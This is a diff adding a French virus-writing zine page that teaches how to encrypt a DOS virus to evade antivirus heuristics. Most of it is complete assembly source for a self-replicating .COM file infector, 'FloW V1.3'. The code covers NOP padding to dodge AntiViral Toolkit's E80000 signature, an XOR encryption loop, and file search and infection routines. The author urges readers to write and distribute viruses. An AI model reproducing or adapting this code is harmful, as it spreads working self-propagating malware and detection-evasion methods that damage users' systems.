@@ -1,0 +1,360 @@
+<html>
+<head>
+<title>Update du virus</title>
+</head>
+<body bgcolor=#000000>
+<center>
+</font>
+<pre>
+<font size=2 color=#ffff00>
+******************************************************************************
+{{{{{{{{{{{{{{{{{{{{{{{{{{  CRYPTAGE DU VIRUS  }}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+******************************************************************************
+</center> </font> </pre> <font size=3 color=#ffffff>
+<br>
+
+Ou comment passer plus inaperçu ?<br>
+Je m'excuse si cet article est très court, mais je l'écrit en speed après avoir lu mon Programmez
+magazine. Dedans je vois un article sur AntiViral Toolkit, qui d'ailleurs est le meilleur anti
+virus a ce jour. Il parle de la recherche heuristique dans un prog pour détecter l'infection.
+Quelques lignes après je trouve que Av toolkit recherche les bits E80000, Or ces bits correspondent
+au call de départ du virus pour déterminez bp qui sert ensuite a situer le virus dans un fichier
+infecté. Me vint alors une idée (ça m'arrive), changez ce call.<br>
+Faire en sorte que le virus fasse un call plus long au dessus des nop (no operation = 90h) 
+et ensuite soustraire les nop rajoutés. Juste histoire de changez le E80000 par E8???? en sorte.
+Voila donc le code source du debut du virus. Je vais pas vous rabacher tout le source, vous devez 
+le connaitre a force, héhé :<br><br>
+<font color=#00FFFF size=3>
+<pre>
+debut:
+
+   db 0e9h,0,0               ;on ecrie ça pour que le prog reconnaisse 
+                             ;qu'il est deja infecte
+                             ;car sinon il va s'auto-infecter
+
+
+virus:
+        call virus_start     ;call pour pouvoir recuperer l'adresse
+
+        db 090h,090h,090h,090h  ;4 nop pour tromper AV-Toolkit (pas de E80000)
+
+virus_start:
+
+   pop bp                      ;qu'on recupere
+   lea cx,[virus_start-4]      ;soustrait les 4 nops       
+   sub bp,cx                   ;et on adapte a nos besoins
+</pre>
+</font>
+Voila tout simplement koi. Je crois qu'y a pas besoin de plus commenter...<br>
+Et voila comment on passe d'un "ALERTE" dans AVtoolkit, a un simple "SUSPECT",
+c'est deja pas mal. Bon maintenant comme je suis sympa, on va aller un peu plus
+loin. On va le crypter notre petit tueur.<br><br>
+Juste avant je vous demanderais, si vous l'avez de me passer la liste de tous les opcodes que 
+recherche AV toolkit. Ca serait vraiment cool ça.<br><br>
+<pre>
+<font size=2 color=#ffff00>
+Cryptage
+********
+</font></pre>
+<br>
+Pour crypter on va utiliser un simple XOR. Cela correspond a un "ou exclusif".
+Pour ceux qui savent pas ce que c'est regardez la table de vérité réalisée avec
+les bits :
+<pre><font color=#FF0000 size=2>
+1 1 0 0
+1 0 1 0
+-------
+0 1 1 0
+</pre></font><br>
+On utilise cela car un simple XOR permet aussi de décrypter. Revenons au virus, il faudra
+une partie, celle du début qui servira a décrypter. Il faut donc que cette partie soit
+non-cryptée, logique.<br>
+Une autre partie sera non-cryptée, c'est celle qui possede la cle de decryptage et le
+flag indiquant si le fichier porteur est crypté (pour que le prog de depart n'essaie
+pas de se décrypter). Pour ce qui est de la routine de cryptage,je m'y prend de manière
+bizarre mais plutot efficace alors... En fait je declare un buffer: cryptbuffer qui contiendra
+a la fois la partie a crypter et la partie finale non-cryptée. Ensuite je ne crypte que
+la partie qu'on veut crypter. Cela me permet de n'utiliser qu'une instruction d'ecriture
+dans le fichier pour ecrire a la fois le code crypté et le non-crypté de fin.<br>
+Cependant attention ne declarez pas votre buffer avec des valeurs car votre virus deviendrait
+bien plus gros. Un "?" suffira. Bon voila, je vais etre obligé de vous rebalancer le source
+car des choses ont étés modifiés pour permettre l'encryption. Par exemple, le code étant devenu
+volumineux, les jmps ne pouvaient plus atteindre leurs cibles d'ou message d'erreur de Tasm.
+Pour y remedier on fait juste des "passerelles" avec des jmps. Une autre chose pour que vous compreniez
+mieux : si on utilise pas de buffer pour l'encryption le virus commence a ce crypter, jusqu'a
+arriver a la fonction de cryptage qui se corromp et conduit a un plantage dans les regles.<br>
+<br>
+Bah voila quoi, j'ai l'impression de pas être franchement clair la... Le source devrait y remedier.
+Second truc, la clé ne varie pas dans cet exemple. Essayez donc de le faire en fonction de l'heure
+du pc, héhé.<br><br>
+Voila le source : (joint dans le zine)
+
+<pre><font color=00FFFF size=2>
+
+CODE    SEGMENT                                                          
+        ASSUME CS:CODE,DS:CODE                                                    
+
+ORG 100H  
+
+debut:
+
+   db 0e9h,0,0               ;on ecrie ça pour que le prog reconnaisse 
+                             ;qu'il est deja infecte
+                             ;car sinon il va s'auto-infecter
+
+
+virus:
+        call virus_start     ;call pour pouvoir recuperer l'adresse
+
+        db 090h,090h,090h,090h  ;4 nop pour tromper AV-Toolkit pro (pas de E80000)
+
+virus_start:
+
+   pop bp                    ;qu'on recupere
+   lea cx,[virus_start-4]    ;soustrait les 4 nops       
+   sub bp,cx                 ;et on adapte a nos besoins
+
+;------------------------------------------------------------------------
+  
+  cmp [bp+cryptverif],0      ;le fichier est crypte ?
+  je restaurebits            ;oui ! on le decrypte ;non ! on saute
+
+  decrypt:
+
+       mov al, [bp+key]                 ;cle de cryptage/decryptage dans al
+       lea bx, [bp+restaurebits]        ;bx pointe sur la partie cryptée
+       mov cx, (virus_end-restaurebits) ;taille du decryptage
+  
+  boucle:
+       xor byte ptr [bx], al  ;le XOR
+       inc bx                 ;bx = bx+1
+       loop boucle            ;boucle tant que cx !=0
+
+;------------------------------------------------------------------------
+
+restaurebits:
+
+   mov cx,3                  ;remet les 3 bits originaux
+   mov di,100h               ;depart du com
+   lea si,[bp+buffer]        ;endroit où on a copié les 3 bits
+   rep movsb                 ;on le fait tant que cx!=0
+
+dta:
+
+   lea  dx,[bp+mydta]        ;adresse de mydta
+   mov  ah,1ah               ;Set DTA
+   int  21h                  ;
+
+CHECK_DAY:
+
+   mov ah,2Ah      ;Get Date
+   int 21h         ;
+   cmp al,0        ;Dimanche ou pas ?
+   jne pasgreve    ;si non, on fait pas la greve
+                   ;sinon on continue
+
+;greve
+
+   lea dx,[bp+message]   ;message !
+   push ax
+   mov ax,0900h
+   int 21h
+   pop ax
+   mov ah,4ch      ;retour au dos
+   int 21h 
+
+
+pasgreve:
+
+
+;findfirst
+
+   mov ah,4Eh                ;
+   lea dx,[bp+fichiercom]    ;findfirst
+   int 21h                   ;
+
+OUVERTURE:
+
+   jc finbis                 ;si on trouve pas on quitte
+
+   mov ax,3D02h              ;ouverture-du-fichier(le 02 indique lecture-ecriture)
+   lea  dx,[bp+mydta+1eh]    ;nom dans DTA_PLACE+1eh
+   int 21h
+
+   mov bx,ax                 ;handle en bx
+
+
+CHECK_INFECTION:             ;ça c'est du code barbare !
+
+   mov ah,3fh                ;lecture du 1er bit
+   mov cx,1                  ;on en lit 1
+   lea dx,[bp+verification]  ;le bit dans verification
+   int 21h                   ;
+
+
+   cmp [bp+verification], 0e9h ;compare le 1er bit a 0e9h
+   jz FERMETUREBIS             ;si = on cherche un autre
+
+INFECTION:
+
+   mov ax, 4200h             ;pointeur du fichier au debut
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah,3fh                ;lecture des premiers bits
+   mov cx,3                  ;on en lit 3
+   lea dx,[bp+buffer]        ;les 3 bits dans buffer
+   int 21h                   ;
+
+
+   mov ax, 4202h             ;pointeur du fichier a la fin
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;                       
+   
+   jmp codagedujmp
+
+;relais-------------------
+
+        FERMETUREBIS:
+        jmp FERMETURE
+
+        finbis:                   ;relais pour le jmp de debut pointant vers la fin
+        jmp fin                   ;se soit pas "out of range"
+
+        OUVERTUREBIS:             ;relais pour que le jmp a la fin
+        jmp OUVERTURE             ;puisse se faire
+
+;fin du relais-----------
+
+
+   codagedujmp:
+
+   sub ax,3
+   mov word ptr [bp+buffer2+1],ax     ;codage du jump
+
+;ecriture du jmp
+
+   mov ax, 4200h             ;pointeur du fichier au debut
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah, 40h               ;écriture du jmp
+   mov cx, 3                 ;on écrit 3 bits
+   lea dx,[bp+buffer2]       ;pointe sur le jmp codé
+   int 21h                   ;
+
+
+cryptage:
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+   mov [bp+cryptverif],1      ;Flag indiquant que le fichier le virus sera crypté
+
+   lea si, [bp+restaurebits]  ;transfere la partie du virus
+   lea di, [bp+cryptbuffer]   ;a copier dans le buffer + les variables non cryptés
+   mov cx, virus_fin-restaurebits  ;taille du transfert
+   rep movsb                  ;on transfere tant que cx!=0
+
+
+   crypt:
+
+   mov al, [bp+key]            ;clé en al
+   lea si, [bp+cryptbuffer]    ;si pointe sur le buffer de cryptage
+   mov cx, (virus_end-restaurebits)  ;taille de seulement ce qu'il faut crypter
+  
+   myboucle:
+       xor byte ptr [si], al   ;le XOR
+       inc si                  ;incrémente
+       loop myboucle           ;on boucle tant que cx!=0
+
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+;infusion
+
+   mov ax, 4202h             ;pointeur du fichier a la fin
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+   mov ah,40h                ;copie le debut du virus
+   mov cx, restaurebits-virus ;
+   lea dx, [bp+virus]        ;
+   int 21h                   ;
+
+   mov ah,40h                ;ecriture de la fin du virus
+   mov cx, virus_fin-restaurebits ;en partie cryptée
+   lea dx,[bp+cryptbuffer]   ;
+   int 21h
+
+
+FERMETURE:
+
+   mov ah,3Eh                ;fermeture-du-fichier
+   int 21h
+
+   mov ah,4Fh                ;findnext
+   int 21h                   ;si y en a pas on se casse
+   jmp OUVERTUREBIS          ;si y en a on revient
+
+
+fin:
+
+;execution-du-prog-victime
+
+fin_cherche:
+   mov  dx,80h               ;replacement de la dta
+   mov  ah,1ah
+   int  21h
+
+   mov di,100h               ;di pointe a 100h (depart des coms)
+   jmp di                    ;le virus passe la main au prog infecte
+
+
+;============================================================================
+
+variables:
+
+   buffer db 3 dup (?)       ;buffer des 3 bits
+   fichiercom db '*.COM',0   ;cible: les coms
+   buffer2 db 0e9h,?,?       ;buffer du jmp de depart
+   verification db ?         ;sert pour tester si le fichier est deja infecté
+   message db 'Je suis votre ordinateur, il est dimanche je refuse donc
+               de travailler !','$'
+   TiPiaX db 'FloW V1.3 By PoSeiDoN (Fr)'
+
+virus_end:
+
+   cryptverif db 0           ;teste si le fichier est crypté ou non
+   key db 23h                ;clé de cryptage
+
+virus_fin:
+
+   cryptbuffer db virus_fin-restaurebits dup (?) ; buffer pour cryptage
+   mydta db 42 dup (?)       ;on le met la car on ne veut pas copier le contenu
+                             ;de la DTA
+CODE ENDS
+END debut
+</pre></font>
+
+Tiens beh tant que j'y pense on place le cryptbuffer après "virus_fin" car on ne veut
+pas que celui ci s'attache au fichier victime. En effet ça reviendrait a copier 2 fois
+le virus a la fin du fichier.
+
+Si vous avez des questions, mailez moi.<br>
+Ps: le milieu des virus est peu développé en france, donc faites progresser le milieu
+en faisant des tuts meilleurs  ou aussi pitoyables que les miens et distribuez tout !<br>
+Pour information, le virus ne fait que 397 octets, ce qui reste plutot acceptable.<br>
+merci de m'avoir lu! Et n'oubliez pas : rien ne vous empêche de faire un virus crypté
+en RSA ou tout autre algo digne de faire chier la NSA. (en tout cas ça fera chier Norton,
+McAfee AVP et bien d'autres)<br><br>
+
+<font size=3 color=#ffff00><br><br>
+<center>
+<pre>TiPiaX/VDS</pre>
+<br>
+</font></body></html>
